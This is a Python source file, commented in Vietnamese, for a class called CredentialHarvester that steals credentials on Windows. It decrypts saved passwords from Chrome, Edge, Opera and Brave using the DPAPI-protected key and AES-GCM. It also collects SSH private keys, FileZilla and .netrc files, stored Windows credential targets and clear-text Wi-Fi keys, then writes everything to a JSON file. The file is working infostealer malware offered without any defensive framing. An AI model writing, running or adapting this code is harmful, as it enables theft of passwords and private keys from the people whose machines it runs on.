import os
import sys
import sqlite3
import win32crypt
import json
import base64
import shutil
import threading
from Crypto.Cipher import AES
import datetime

class CredentialHarvester:
    def __init__(self):
        self.credentials = []
        self.browsers = {
            'chrome': self._get_chrome_credentials,
            'firefox': self._get_firefox_credentials,
            'edge': self._get_edge_credentials,
            'opera': self._get_opera_credentials,
            'brave': self._get_brave_credentials
        }
        
        self.network_creds = {
            'ssh': self._get_ssh_credentials,
            'ftp': self._get_ftp_credentials,
            'wifi': self._get_wifi_passwords
        }
        
    def harvest_all(self):
        """Thu thập tất cả credentials"""
        threads = []
        
        # Browser credentials
        for browser in self.browsers:
            t = threading.Thread(target=self.browsers[browser])
            threads.append(t)
            t.start()
            
        # Windows credentials
        t = threading.Thread(target=self._get_windows_credentials)
        threads.append(t)
        t.start()
        
        # Network credentials
        for cred_type in self.network_creds:
            t = threading.Thread(target=self.network_creds[cred_type])
            threads.append(t)
            t.start()
        
        # Đợi tất cả threads hoàn thành
        for t in threads:
            t.join()
            
        return self.credentials
        
    def _get_chrome_credentials(self):
        """Thu thập Chrome passwords"""
        try:
            # Chrome SQLite DB path
            path = os.path.join(os.environ['LOCALAPPDATA'],
                              r"Google\Chrome\User Data\Default\Login Data")
                              
            # Copy DB vì file gốc đang được lock
            temp_path = os.path.join(os.environ['TEMP'], 'chrome_login_data')
            shutil.copy2(path, temp_path)
            
            # Kết nối DB
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Lấy key để decrypt
            key = self._get_chrome_encryption_key()
            
            # Query credentials
            cursor.execute("""
                SELECT origin_url, username_value, password_value 
                FROM logins
            """)
            
            for row in cursor.fetchall():
                if not row[1] or not row[2]:
                    continue
                    
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Decrypt password
                password = self._decrypt_chrome_password(key, encrypted_password)
                
                if password:
                    self.credentials.append({
                        'source': 'chrome',
                        'url': url,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.datetime.now().isoformat()
                    })
                    
            conn.close()
            os.remove(temp_path)  # Xóa temp file
            
        except Exception as e:
            print(f"Chrome harvesting error: {str(e)}")
            
    def _get_firefox_credentials(self):
        """Thu thập Firefox passwords"""
        try:
            # Firefox profile path
            profile_path = os.path.join(os.environ['APPDATA'],
                                      r"Mozilla\Firefox\Profiles")
                                      
            for profile in os.listdir(profile_path):
                db_path = os.path.join(profile_path, profile, "logins.json")
                if not os.path.exists(db_path):
                    continue
                    
                # Copy file
                temp_path = os.path.join(os.environ['TEMP'], 'firefox_logins.json')
                shutil.copy2(db_path, temp_path)
                
                with open(temp_path, 'r') as f:
                    data = json.load(f)
                    
                # Decrypt data
                for login in data.get('logins', []):
                    username = self._decrypt_firefox_data(login['encryptedUsername'])
                    password = self._decrypt_firefox_data(login['encryptedPassword'])
                    
                    self.credentials.append({
                        'source': 'firefox',
                        'url': login['hostname'],
                        'username': username,
                        'password': password,
                        'timestamp': datetime.datetime.now().isoformat()
                    })
                    
                os.remove(temp_path)
                
        except Exception as e:
            print(f"Firefox harvesting error: {str(e)}")
            
    def _get_edge_credentials(self):
        """Thu thập Edge passwords"""
        try:
            # Edge SQLite DB path
            path = os.path.join(os.environ['LOCALAPPDATA'],
                              r"Microsoft\Edge\User Data\Default\Login Data")
                              
            # Copy DB
            temp_path = os.path.join(os.environ['TEMP'], 'edge_login_data')
            shutil.copy2(path, temp_path)
            
            # Kết nối DB
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Lấy key để decrypt
            key = self._get_edge_encryption_key()
            
            # Query credentials
            cursor.execute("""
                SELECT origin_url, username_value, password_value 
                FROM logins
            """)
            
            for row in cursor.fetchall():
                if not row[1] or not row[2]:
                    continue
                    
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Decrypt password
                password = self._decrypt_edge_password(key, encrypted_password)
                
                if password:
                    self.credentials.append({
                        'source': 'edge',
                        'url': url,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.datetime.now().isoformat()
                    })
                    
            conn.close()
            os.remove(temp_path)
            
        except Exception as e:
            print(f"Edge harvesting error: {str(e)}")
            
    def _get_windows_credentials(self):
        """Thu thập Windows credentials"""
        try:
            import subprocess
            
            # Chạy cmdkey để lấy stored credentials
            process = subprocess.Popen(
                ['cmdkey', '/list'], 
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output, _ = process.communicate()
            
            # Parse output
            creds = []
            current_cred = {}
            
            for line in output.decode().split('\n'):
                if 'Target:' in line:
                    if current_cred:
                        creds.append(current_cred)
                    current_cred = {'target': line.split('Target:')[1].strip()}
                elif 'User:' in line:
                    current_cred['username'] = line.split('User:')[1].strip()
                    
            if current_cred:
                creds.append(current_cred)
                
            # Thêm vào credentials list
            for cred in creds:
                self.credentials.append({
                    'source': 'windows',
                    'target': cred.get('target'),
                    'username': cred.get('username'),
                    'timestamp': datetime.datetime.now().isoformat()
                })
                
        except Exception as e:
            print(f"Windows credential harvesting error: {str(e)}")
            
    def _get_chrome_encryption_key(self):
        """Lấy Chrome encryption key"""
        try:
            path = os.path.join(os.environ['LOCALAPPDATA'],
                              r"Google\Chrome\User Data\Local State")
                              
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Remove DPAPI prefix
            
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        except Exception:
            return None
            
    def _decrypt_chrome_password(self, key, encrypted_password):
        """Decrypt Chrome password"""
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        except:
            return None
            
    def _decrypt_firefox_data(self, encrypted_data):
        """Decrypt Firefox data"""
        # Firefox sử dụng NSS library
        # Implement NSS decryption logic here
        return None
        
    def _get_edge_encryption_key(self):
        """Lấy Edge encryption key"""
        try:
            path = os.path.join(os.environ['LOCALAPPDATA'],
                              r"Microsoft\Edge\User Data\Local State")
                              
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Remove DPAPI prefix
            
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        except Exception:
            return None
            
    def _decrypt_edge_password(self, key, encrypted_password):
        """Decrypt Edge password"""
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        except:
            return None
            
    def export_credentials(self, output_file):
        """Export credentials ra file"""
        try:
            with open(output_file, 'w') as f:
                json.dump(self.credentials, f, indent=2)
            return True
        except:
            return False
            
    def _get_opera_credentials(self):
        """Thu thập Opera passwords"""
        try:
            # Opera SQLite DB path
            path = os.path.join(os.environ['APPDATA'],
                               r"Opera Software\Opera Stable\Login Data")
                               
            # Copy DB vì file gốc đang được lock
            temp_path = os.path.join(os.environ['TEMP'], 'opera_login_data')
            shutil.copy2(path, temp_path)
            
            # Kết nối DB
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Lấy key để decrypt
            key = self._get_opera_encryption_key()
            
            # Query credentials
            cursor.execute("""
                SELECT origin_url, username_value, password_value
                FROM logins
            """)
            
            for row in cursor.fetchall():
                if not row[1] or not row[2]:
                    continue
                    
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Decrypt password
                password = self._decrypt_chrome_password(key, encrypted_password)
                
                if password:
                    self.credentials.append({
                        'source': 'opera',
                        'url': url,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.datetime.now().isoformat()
                    })
                    
            conn.close()
            os.remove(temp_path)
            
        except Exception as e:
            print(f"Opera harvesting error: {str(e)}")
            
    def _get_brave_credentials(self):
        """Thu thập Brave passwords"""
        try:
            # Brave SQLite DB path
            path = os.path.join(os.environ['LOCALAPPDATA'],
                               r"BraveSoftware\Brave-Browser\User Data\Default\Login Data")
                               
            # Copy DB
            temp_path = os.path.join(os.environ['TEMP'], 'brave_login_data')
            shutil.copy2(path, temp_path)
            
            # Kết nối DB
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Lấy key để decrypt
            key = self._get_brave_encryption_key()
            
            # Query credentials
            cursor.execute("""
                SELECT origin_url, username_value, password_value
                FROM logins
            """)
            
            for row in cursor.fetchall():
                if not row[1] or not row[2]:
                    continue
                    
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Decrypt password
                password = self._decrypt_chrome_password(key, encrypted_password)
                
                if password:
                    self.credentials.append({
                        'source': 'brave',
                        'url': url,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.datetime.now().isoformat()
                    })
                    
            conn.close()
            os.remove(temp_path)
            
        except Exception as e:
            print(f"Brave harvesting error: {str(e)}")
            
    def _get_ssh_credentials(self):
        """Thu thập SSH credentials"""
        try:
            # Check common SSH paths
            ssh_paths = [
                os.path.expanduser('~/.ssh'),
                'C:\\Users\\%s\\.ssh' % os.getenv('USERNAME'),
                'C:\\Program Files\\PuTTY'
            ]
            
            for path in ssh_paths:
                if not os.path.exists(path):
                    continue
                    
                # Scan for key files and known_hosts
                for root, _, files in os.walk(path):
                    for file in files:
                        if file in ['id_rsa', 'id_dsa', 'known_hosts', 'config']:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'r') as f:
                                content = f.read()
                                self.credentials.append({
                                    'source': 'ssh',
                                    'type': file,
                                    'path': file_path,
                                    'content': content,
                                    'timestamp': datetime.datetime.now().isoformat()
                                })
                                
        except Exception as e:
            print(f"SSH credential harvesting error: {str(e)}")
            
    def _get_ftp_credentials(self):
        """Thu thập FTP credentials"""
        try:
            # Check common FTP config paths
            ftp_paths = [
                os.path.expanduser('~/'),
                'C:\\Users\\%s' % os.getenv('USERNAME'),
                'C:\\Program Files\\FileZilla'
            ]
            
            ftp_files = [
                '.netrc',
                'filezilla.xml',
                'sites.xml'
            ]
            
            for path in ftp_paths:
                if not os.path.exists(path):
                    continue
                    
                for file in ftp_files:
                    file_path = os.path.join(path, file)
                    if os.path.exists(file_path):
                        with open(file_path, 'r') as f:
                            content = f.read()
                            self.credentials.append({
                                'source': 'ftp',
                                'type': file,
                                'path': file_path,
                                'content': content,
                                'timestamp': datetime.datetime.now().isoformat()
                            })
                            
        except Exception as e:
            print(f"FTP credential harvesting error: {str(e)}")
            
    def _get_wifi_passwords(self):
        """Thu thập WiFi passwords"""
        try:
            # Sử dụng netsh để lấy profiles
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
            profiles = [line.split(':')[1].strip() for line in data.split('\n') if "All User Profile" in line]
            
            for profile in profiles:
                try:
                    # Lấy password cho mỗi profile
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8')
                    
                    # Tìm password trong output
                    password = None
                    for line in results.split('\n'):
                        if "Key Content" in line:
                            password = line.split(':')[1].strip()
                            break
                            
                    if password:
                        self.credentials.append({
                            'source': 'wifi',
                            'ssid': profile,
                            'password': password,
                            'timestamp': datetime.datetime.now().isoformat()
                        })
                        
                except subprocess.CalledProcessError:
                    continue
                    
        except Exception as e:
            print(f"WiFi password harvesting error: {str(e)}")
            
    def _get_opera_encryption_key(self):
        """Lấy Opera encryption key"""
        try:
            path = os.path.join(os.environ['APPDATA'],
                             r"Opera Software\Opera Stable\Local State")
                             
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Remove DPAPI prefix
            
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        except Exception:
            return None
            
    def _get_brave_encryption_key(self):
        """Lấy Brave encryption key"""
        try:
            path = os.path.join(os.environ['LOCALAPPDATA'],
                             r"BraveSoftware\Brave-Browser\User Data\Local State")
                             
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Remove DPAPI prefix
            
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        except Exception:
            return None